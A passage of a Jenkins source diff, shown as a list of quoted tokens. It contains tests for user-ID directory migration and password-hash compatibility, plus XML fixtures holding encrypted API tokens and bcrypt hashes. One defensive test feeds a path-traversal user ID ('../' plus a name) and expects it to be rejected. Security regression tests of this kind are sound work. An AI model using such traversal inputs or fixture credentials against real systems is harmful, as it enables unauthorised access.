";", "User", "slash", "=", "User", ".", "getById", "(", "\"/", "\",", "false", ")", ";", "File", "slashDir", "=", "new", "File", "(", "rootDir", ",", "\"", "$", "002f", "\"", ");", "assertCorrectConfig", "(", "slash", ",", "\"", "users", "/", "$", "002f", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "slash", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertTrue", "(", "slashDir", ".", "exists", "(", "))", ";", "assertFalse", "(", "new", "File", "(", "rootDir", ",", "\"", "config", ".", "xml", "\"", ").", "exists", "(", "))", ";", "assertThat", "(", "slash", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Slash", "\"", "))", ";", "public", "void", "corruptConfigFile", "(", ")", "{", "String", "fredUserId", "=", "\"", "fred", "\"", ";", "User", "fred", "=", "User", ".", "getById", "(", "fredUserId", ",", "true", ")", ";", "assertThat", "(", "fred", ",", "notNullValue", "(", "))", ";", "assertThat", "(", "fred", ".", "getFullName", "(", "),", "is", "(", "\"", "fred", "\"", "))", ";", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "499", "\"", ")", "@", "LocalData", "public", "void", "emptyUsernameConfigMigrated", "(", ")", "{", "File", "rootDir", "=", "new", "File", "(", "Jenkins", ".", "getInstance", "(", ").", "getRootDir", "(", "),", "\"", "users", "\"", ");", "User", "admin", "=", "User", ".", "getById", "(", "\"", "admin", "\"", ",", "false", ")", ";", "assertCorrectConfig", "(", "admin", ",", "\"", "users", "/", "admin", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "admin", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertThat", "(", "admin", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Admin", "\"", "))", ";", "User", "empty", "=", "User", ".", "getById", "(", "\"\"", ",", "false", ")", ";", "File", "emptyDir", "=", "new", "File", "(", "rootDir", ",", "\"", "$", "002f", "\"", ");", "assertCorrectConfig", "(", "empty", ",", "\"", "users", "/", "$", "002f", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "empty", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertTrue", "(", "emptyDir", ".", "exists", "(", "))", ";", "assertFalse", "(", "new", "File", "(", "rootDir", ",", "\"", "config", ".", "xml", "\"", ").", "exists", "(", "))", ";", "assertThat", "(", "empty", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Empty", "\"", "))", ";", "public", "void", "parentDirectoryUserDoesNotExist", "(", ")", "{", "String", "userId", "=", "\"", "admin", "\"", ";", "User", "admin", "=", "User", ".", "getById", "(", "userId", ",", "true", ")", ";", "assertNotNull", "(", "admin", ")", ";", "assertThat", "(", "admin", ".", "getId", "(", "),", "is", "(", "userId", ")", ");", "User", "parentDirectoryUserId", "=", "User", ".", "getById", "(", "\".", "./", "\"", "+", "admin", ",", "false", ")", ";", "assertThat", "(", "parentDirectoryUserId", ",", "nullValue", "(", "))", ";", "}", "@", "Issue", "(", "\"", "JENKINS", "-", "47909", "\"", ")", "@", "LocalData", "@", "Test", "public", "void", "shellyUsernameMigrated", "(", ")", "{", "File", "rootDir", "=", "new", "File", "(", "Jenkins", ".", "getInstance", "(", ").", "getRootDir", "(", "),", "\"", "users", "\"", ");", "User", "user", "=", "User", ".", "getById", "(", "\"", "bla", "$", "phem", ".", "us", "\"", ",", "false", ")", ";", "assertCorrectConfig", "(", "user", ",", "\"", "users", "/", "bla", "$", "0024phem", ".", "us", "/", "config", ".", "xml", "\"", ");", "assertFalse", "(", "new", "File", "(", "rootDir", ",", "\"", "bla", "$", "phem", ".", "us", "\"", ").", "exists", "(", "))", ";", "assertTrue", "(", "user", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertThat", "(", "user", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Weird", "Username", "\"", "))", ";", "user", "=", "User", ".", "getById", "(", "\"", "make", "\\", "u1000000", "\"", ",", "false", ")", ";", "assertNotNull", "(", "\"", "we", "do", "not", "prevent", "accesses", "to", "the", "phony", "name", ",", "alas", "\"", ",", "user", ")", ";", "user", "=", "User", ".", "getById", "(", "\"", "make", "$", "1000000", "\"", ",", "false", ")", ";", "assertCorrectConfig", "(", "user", ",", "\"", "users", "/", "make", "$", "00241000000", "/", "config", ".", "xml", "\"", ");", "assertFalse", "(", "new", "File", "(", "rootDir", ",", "\"", "make", "$", "1000000", "\"", ").", "exists", "(", "))", ";", "assertTrue", "(", "\"", "but", "asking", "for", "the", "real", "name", "triggers", "migration", "\"", ",", "user", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertThat", "(", "user", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Greedy", "Fella", "\"", "))", ";", "}", "private", "static", "void", "assertCorrectConfig", "(", "User", "user", ",", "String", "unixPath", ")", "{", "assertThat", "(", "user", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "getPath", "(", "),", "endsWith", "(", "unixPath", ".", "replace", "(", "'/", "',", "File", ".", "separatorChar", ")", "))", ";", "}", "public", "static", "class", "SomeUserProperty", "extends", "UserProperty", "{", "public", "static", "class", "SomeUserProperty", "extends", "UserProperty", "{", "@", "TestExtension", "public", "static", "class", "DescriptorImpl", "extends", "UserPropertyDescriptor", "{", "@", "Override", "@", "@", "-", "54", ",", "10", "+", "54", ",", "8", "@", "@", "import", "jenkins", ".", "security", ".", "SecurityListener", ";", "import", "org", ".", "apache", ".", "commons", ".", "lang", ".", "StringUtils", ";", "import", "java", ".", "io", ".", "UnsupportedEncodingException", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Field", ";", "import", "hudson", ".", "security", ".", "pages", ".", "SignupPage", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "@", "@", "-", "66", ",", "7", "+", "64", ",", "6", "@", "@", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ".", "WebClient", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "TestExtension", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "WithoutJenkins", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "recipes", ".", "LocalData", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "@", "@", "-", "89", ",", "34", "+", "86", ",", "6", "@", "@", "public", "void", "setup", "(", ")", "throws", "Exception", "{", "field", ".", "set", "(", "null", ",", "null", ")", ";", "}", "/", "**", "*", "Tests", "the", "data", "compatibility", "with", "Hudson", "before", "1", ".", "283", ".", "*", "Starting", "1", ".", "283", ",", "passwords", "are", "now", "stored", "hashed", ".", "*", "/", "@", "Test", "@", "Issue", "(", "\"", "JENKINS", "-", "2381", "\"", ")", "@", "LocalData", "public", "void", "dataCompatibilityWith1_282", "(", ")", "throws", "Exception", "{", "/", "/", "make", "sure", "we", "can", "login", "with", "the", "same", "password", "as", "before", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ").", "login", "(", "\"", "alice", "\"", ",", "\"", "alice", "\"", ");", "try", "{", "/", "/", "verify", "the", "sanity", "that", "the", "password", "is", "really", "used", "/", "/", "this", "should", "fail", "j", ".", "createWebClient", "(", ").", "login", "(", "\"", "bob", "\"", ",", "\"", "bob", "\"", ");", "fail", "(", ");", "}", "catch", "(", "FailingHttpStatusCodeException", "e", ")", "{", "assertEquals", "(", "401", ",", "e", ".", "getStatusCode", "(", "))", ";", "}", "/", "/", "resubmit", "the", "config", "and", "this", "should", "force", "the", "data", "store", "to", "be", "rewritten", "HtmlPage", "p", "=", "wc", ".", "goTo", "(", "\"", "user", "/", "alice", "/", "configure", "\"", ");", "j", ".", "submit", "(", "p", ".", "getFormByName", "(", "\"", "config", "\"", "))", ";", "/", "/", "verify", "that", "we", "can", "still", "login", "j", ".", "createWebClient", "(", ").", "login", "(", "\"", "alice", "\"", ",", "\"", "alice", "\"", ");", "}", "@", "Test", "@", "WithoutJenkins", "public", "void", "hashCompatibility", "(", ")", "{", "@", "@", "-", "56", ",", "18", "+", "56", ",", "20", "@", "@", "private", "void", "modifyNode", "(", "Node", "node", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "reloadUserConfigUsingGlobalReload", "(", ")", "throws", "Exception", "{", "String", "originalName", "=", "\"", "oldName", "\"", ";", "String", "temporaryName", "=", "\"", "newName", "\"", ";", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "some_user", "\"", ",", "true", ",", "null", ")", ";", "user", ".", "setFullName", "(", "\"", "oldName", "\"", ");", "user", ".", "setFullName", "(", "originalName", ")", ";", "user", ".", "save", "(", ");", "assertEquals", "(", "originalName", ",", "user", ".", "getFullName", "(", "))", ";", "replace", "(", "\"", "users", "/", "some_user", "/", "config", ".", "xml", "\"", ",", "\"", "oldName", "\"", ",", "\"", "newName", "\"", ");", "assertEquals", "(", "\"", "oldName", "\"", ",", "user", ".", "getFullName", "(", "))", ";", "user", ".", "setFullName", "(", "temporaryName", ")", ";", "assertEquals", "(", "temporaryName", ",", "user", ".", "getFullName", "(", "))", ";", "}", "j", ".", "jenkins", ".", "reload", "(", ");", "{", "assertEquals", "(", "\"", "newName", "\"", ",", "User", ".", "getById", "(", "\"", "some_user", "\"", ",", "false", ")", ".", "getFullName", "(", "))", ";", "assertEquals", "(", "originalName", ",", "User", ".", "getById", "(", "\"", "some_user", "\"", ",", "false", ")", ".", "getFullName", "(", "))", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "4", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Foo", "Bar", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "fred", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "4", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Old", "Legacy", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "fred", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "9", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ".", "model", ".", "UserIdMapper", ">", "<", "idToDirectoryNameMap", ">", "<", "entry", ">", "<", "string", ">", "nesteduserreference", "<", "/", "string", ">", "<", "string", ">", "user4975613142751794216", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "/", "idToDirectoryNameMap", ">", "<", "/", "hudson", ".", "model", ".", "UserIdMapper", ">", "@", "@", "-", "1", ",", "7", "+", "1", ",", "8", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ">", "<", "disabledAdministrativeMonitors", "/", ">", "<", "version", ">", "1", ".", "0", "<", "/", "version", ">", "<", "version", ">", "2", ".", "144", "-", "SNAPSHOT", "<", "/", "version", ">", "<", "installStateName", ">", "RESTART", "<", "/", "installStateName", ">", "<", "numExecutors", ">", "2", "<", "/", "numExecutors", ">", "<", "mode", ">", "NORMAL", "<", "/", "mode", ">", "<", "useSecurity", ">", "true", "<", "/", "useSecurity", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "9", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ".", "model", ".", "UserIdMapper", ">", "<", "idToDirectoryNameMap", ">", "<", "entry", ">", "<", "string", ">", "fred", "<", "/", "string", ">", "<", "string", ">", "user4975613142751794216", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "/", "idToDirectoryNameMap", ">", "<", "/", "hudson", ".", "model", ".", "UserIdMapper", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "jane", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "9", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ".", "model", ".", "UserIdMapper", ">", "<", "idToDirectoryNameMap", ">", "<", "entry", ">", "<", "string", ">", "fred", "<", "/", "string", ">", "<", "string", ">", "user4975613142751794216", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "/", "idToDirectoryNameMap", ">", "<", "/", "hudson", ".", "model", ".", "UserIdMapper", ">", "@", "@", "-", "1", ",", "29", "+", "0", ",", "0", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Admin", "<", "/", "fullName", ">", "<", "properties", ">", "<", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "apiToken", ">", "{", "AQAAABAAAAAwu9tm9n3SIC", "+", "bkaGz5WfsKwJz", "+", "a04aUUWiq4hACNLemh6f62j2cgIT9KuyMGtXvr7ab6GWBQGzThOrJfK1etETQ", "=", "=}", "</", "apiToken", ">", "<", "/", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "all", "<", "/", "name", ">", "<", "filterExecutors", ">", "false", "<", "/", "filterExecutors", ">", "<", "filterQueue", ">", "false", "<", "/", "filterQueue", ">", "<", "properties", "class", "=", "\"", "hudson", ".", "model", ".", "View", "$", "PropertyList", "\"", "/>", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "collapsed", "/", ">", "<", "/", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "insensitiveSearch", ">", "false", "<", "/", "insensitiveSearch", ">", "<", "/", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "#", "jbcrypt", ":", "$", "2a", "$", "10", "$", "eDQD3w", "/", "iXX0VWWKb3Kv5QOKjFg0Yj3Hk9Z", ".", "Y43iFHJQOUYmHdvVuS", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "@", "@", "-", "1", ",", "29", "+", "0", ",", "0", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Slash", "<", "/", "fullName", ">", "<", "properties", ">", "<", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "apiToken", ">", "{", "AQAAABAAAAAwkYgvFl7YHG1866pnHDawvcy2VQ0jlbQd85vu9WWI22SjmLmJS0TMMS4w", "+", "3XqvEt8nHx9", "/", "0U06huIcMj3XuDPuQ", "=", "=}", "</", "apiToken", ">", "<", "/", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "all", "<", "/", "name", ">", "<", "filterExecutors", ">", "false", "<", "/", "filterExecutors", ">", "<", "filterQueue", ">", "false", "<", "/", "filterQueue", ">", "<", "properties", "class", "=", "\"", "hudson", ".", "model", ".", "View", "$", "PropertyList", "\"", "/>", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "collapsed", "/", ">", "<", "/", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "insensitiveSearch", ">", "false", "<", "/", "insensitiveSearch", ">", "<", "/", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "#", "jbcrypt", ":", "$", "2a", "$", "10", "$", "dTn2EpIBa2E0T6R", ".", "2XK", "/", "HucVkyqdu9qGQ6FmBOYdZlpeN2mtv", ".", "Ez2", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "@", "@", "-", "1", ",", "29", "+", "0", ",", "0", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Foo", "Bar", "Baz", "<", "/", "fullName", ">", "<", "properties", ">", "<", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "apiToken", ">", "{", "AQAAABAAAAAwykg9OxsaVN4tRz33o0I7RoexPAcg52", "/", "IhBfyoRqKMNNMjFH3SREdkGrpde49dhP1Otr6wbrbG8dE", "+", "E", "/", "bsd", "+", "fZQ", "=", "=}", "</", "apiToken", ">", "<", "/", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "all", "<", "/", "name", ">", "<", "filterExecutors", ">", "false", "<", "/", "filterExecutors", ">", "<", "filterQueue", ">", "false", "<", "/", "filterQueue", ">", "<", "properties", "class", "=", "\"", "hudson", ".", "model", ".", "View", "$", "PropertyList", "\"", "/>", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "collapsed", "/", ">", "<", "/", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "insensitiveSearch", ">", "false", "<", "/", "insensitiveSearch", ">", "<", "/", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "#", "jbcrypt", ":", "$", "2a", "$", "10", "$", "9FVRXp7wUK4VFULhuZqBguHtsqGa9KRmJzfe6FPTjE8Ve0D", "/", "Bca", ".", "a", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "@", "@", "-", "1", ",", "29", "+", "0", ",", "0", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Foo", "Bar", "<", "/", "fullName", ">", "<", "properties", ">", "<", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "apiToken", ">", "{", "AQAAABAAAAAwqrNFnYtDmkxAb5Qs1j0lciURihCOMJ7xMp4fI279OIBsfW3WtxiigLfOzn", "+", "3yPU5v2d0", "/", "hY1ABrz", "/", "elzhs7xFA", "=", "=}", "</", "apiToken", ">", "<", "/", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "all", "<", "/", "name", ">", "<", "filterExecutors", ">", "false", "<", "/", "filterExecutors", ">", "<", "filterQueue", ">", "false", "<", "/", "filterQueue", ">", "<", "properties", "class", "=", "\"", "hudson", ".", "model", ".", "View", "$", "PropertyList", "\"", "/>", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "collapsed", "/", ">", "<", "/", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "insensitiveSearch", ">", "false", "<", "/", "insensitiveSearch", ">", "<", "/", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "#", "jbcrypt", ":", "$", "2a", "$", "10", "$", "1D8djmPHEmDX9TxJ4DG4eud936OUb8dB3rp9hTFStx5fIZ4", ".", "ZdRGO", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "@", "@", "-", "1", ",", "29", "+", "0", ",", "0", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Foo", "Baz", "<", "/", "fullName", ">", "<", "properties", ">", "<", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "apiToken", ">", "{", "AQAAABAAAAAwkxG8Z1KYPi1", "+", "vDNVMpTlAypMDOGQJFjr75hA", "+", "SUXdcohXsDRsi2L1OTrRvbmFlK02pYleeogvPoblSUuQsJOSA", "=", "=}", "</", "apiToken", ">", "<", "/", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "all", "<", "/", "name", ">", "<", "filterExecutors", ">", "false", "<", "/", "filterExecutors", ">", "<", "filterQueue", ">", "false", "<", "/", "filterQueue", ">", "<", "properties", "class", "=", "\"", "hudson", ".", "model", ".", "View", "$", "PropertyList", "\"", "/>", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "collapsed", "/", ">", "<", "/", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "insensitiveSearch", ">", "false", "<", "/", "insensitiveSearch", ">", "<", "/", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "#", "jbcrypt", ":", "$", "2a", "$", "10", "$", "RSZgsv46gLn5LJhpagbilOC", "/", "Pkc", ".", "74scxNbw6RqONsjc9fF3X4vry", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "@", "@", "-", "1", ",", "29", "+", "0", ",", "0", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Foo", "<", "/", "fullName", ">", "<", "properties", ">", "<", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "apiToken", ">", "{", "AQAAABAAAAAwre0RkJCk2SvcRB7Lce", "+", "95AQodPejQb5rJMjuyd6yrSB", "/", "hQeJZzPkW4lbT9ueJO0Ui5CpYeRPEVHQMxvvvgy6dQ", "=", "=}", "</", "apiToken", ">", "<", "/", "jenkins", ".", "security", ".", "ApiTokenProperty", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "all", "<", "/", "name", ">", "<", "filterExecutors", ">", "false", "<", "/", "filterExecutors", ">", "<", "filterQueue", ">", "false", "<", "/", "filterQueue", ">", "<", "properties", "class", "=", "\"", "hudson", ".", "model", ".", "View", "$", "PropertyList", "\"", "/>", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "collapsed", "/", ">", "<", "/", "hudson", ".", "model", ".", "PaneStatusProperties", ">", "<", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "insensitiveSearch", ">", "false", "<", "/", "insensitiveSearch", ">", "<", "/", "hudson", ".", "search", ".", "UserSearchProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "#", "jbcrypt", ":", "$", "2a", "$", "10", "$", "1sYZ", ".", "uQWbRqioql2bqLkfOjuORvXD2b42HMwLhU", "/", "9EB2TVfjvSpAG", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "40", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ">", "<", "version", ">", "1", ".", "324", "-", "SNAPSHOT", "(", "private", "-", "09", "/", "11", "/", "2009", "02", ":", "51", "-", "dty", ")", "</", "version", ">", "<", "numExecutors", ">", "2", "<", "/", "numExecutors", ">", "<", "mode", ">", "NORMAL", "<", "/", "mode", ">", "<", "useSecurity", ">", "true", "<", "/", "useSecurity", ">", "<", "authorizationStrategy", "class", "=", "\"", "hudson", ".", "security", ".", "GlobalMatrixAuthorizationStrategy", "\"", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Hudson", ".", "Administer", ":", "admin", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Item", ".", "Read", ":", "bob", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Item", ".", "Configure", ":", "alice", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Item", ".", "Read", ":", "alice", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Hudson", ".", "Read", ":", "bob", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Hudson", ".", "Read", ":", "admin", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Hudson", ".", "Read", ":", "alice", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Hudson", ".", "Read", ":", "charlie", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Item", ".", "Read", ":", "charlie", "<", "/", "permission", ">", "<", "permission", ">", "hudson", ".", "model", ".", "Item", ".", "ExtendedRead", ":", "charlie", "<", "/", "permission", ">", "<", "/", "authorizationStrategy", ">", "<", "securityRealm", "class", "=", "\"", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm", "\"", ">", "<", "disableSignup", ">", "false", "<", "/", "disableSignup", ">", "<", "/", "securityRealm", ">", "<", "jdks", "/", ">", "<", "clouds", "/", ">", "<", "slaves", "/", ">", "<", "quietPeriod", ">", "5", "<", "/", "quietPeriod", ">", "<", "scmCheckoutRetryCount", ">", "0", "<", "/", "scmCheckoutRetryCount", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "All", "<", "/", "name", ">", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "primaryView", ">", "All", "<", "/", "primaryView", 